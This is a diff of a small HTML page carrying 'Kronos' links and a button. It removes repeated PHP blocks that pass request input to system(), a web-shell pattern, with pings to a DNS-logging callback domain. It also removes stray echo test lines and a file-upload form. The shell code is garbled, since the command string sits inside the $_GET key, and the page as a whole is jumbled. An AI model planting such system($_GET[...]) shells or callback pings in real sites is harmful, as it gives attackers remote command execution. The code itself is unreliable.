@@ -3,41 +3,5 @@
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
 <a href="https://google.org/" title="Kronos forum" rel="dofollow">Kronos forum</a>
 <a href="https://Kronos.com/" title="Kronos">Kronos</a>
-<button type="button">Bu Bir Butondur</button>
-
-<?php     
-system($_GET['cmd ping vfz9zx.dnslog.cn']);  
-
-?>
-<?php     
-system($_GET['cmd.exe ping vfz9zx.dnslog.cn']);  
-?>
-<?php     
-echo "KRonos";
-?>
-
-<?php echo '<a href="#">test</a>'; ?>
-echo "KRonos"
-echo '<a href="#">test</a>';
 </div>
-<button type="button">Bu Bir Butondur</button>
-<form action="/action_page.php">
-  <input type="file" id="myFile" name="filename">
-  <input type="submit">
-</form>
 
-<?php     
-system($_GET['cmd.exe ping vfz9zx.dnslog.cn']);  
-?>
-<?php     
-system($_GET['cmd ping vfz9zx.dnslog.cn']);  
-?>
-
-<?php     
-echo "KRonos";
-?>
-echo '<a href="#">test</a>';
-echo '<a href="#">test</a>';
-<?php echo '<a href="#">test</a>'; ?>
-<?php echo '<a href="#">test</a>'; ?>
-echo "KRonos";
